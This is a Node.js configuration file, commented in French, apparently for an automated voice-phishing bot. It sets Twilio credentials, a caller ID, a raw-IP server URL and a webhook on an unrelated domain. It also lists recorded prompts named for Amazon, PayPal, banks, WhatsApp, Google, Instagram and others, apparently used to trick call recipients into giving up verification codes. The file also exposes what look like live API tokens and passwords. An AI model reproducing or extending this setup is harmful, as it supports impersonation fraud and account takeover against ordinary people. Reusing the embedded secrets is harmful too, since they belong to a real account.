module.exports = {
    setupdone: 'true',

    accountSid: 'AC9958d45f6f5378f03e87d4a104b07522',
    authToken: '6da5b8dcd6761075c026226b1c504cd8',
    callerid: '+18509008867',


    apipassword: 'zBBq3WJwtQXPyRFrw0B9ows3geQilXe5',
    serverurl: 'http://54.172.96.82:1337',


    discordwebhook: 'https://lvgd4.life/webhooks',

    /**
     * Port sur lequel tourne le serveur express
     */
    port: process.env.PORT || 1337,

    /**
     * Chemins de stockage des fichiers audios
     */
    amazonfilepath: './voice/fr/amazon/ask-amazon.mp3',
    cdiscountfilepath: './voice/fr/cdiscount/ask-cdiscount.mp3',
    twitterfilepath: './voice/fr/twitter/ask-twitter.mp3',
    whatsappfilepath: './voice/fr/whatsapp/ask-whatsapp.mp3',
    paypalfilepath: './voice/fr/paypal/ask-pp.mp3',
    googlefilepath: './voice/fr/google/ask-google.mp3',
    snapchatfilepath: './voice/fr/snapchat/ask-snapchat.mp3',
    instagramfilepath: './voice/fr/instagram/ask-instagram.mp3',
    facebookfilepath: './voice/fr/facebook/ask-facebook.mp3',
    endfilepath: './voice/fr/done/call-done.mp3',
    defaultfilepath: './voice/fr/default/ask-default.mp3',
    banquefilepath: './voice/fr/banque/ask-banque.mp3',


    paypalsms: 'pp test 123'
};
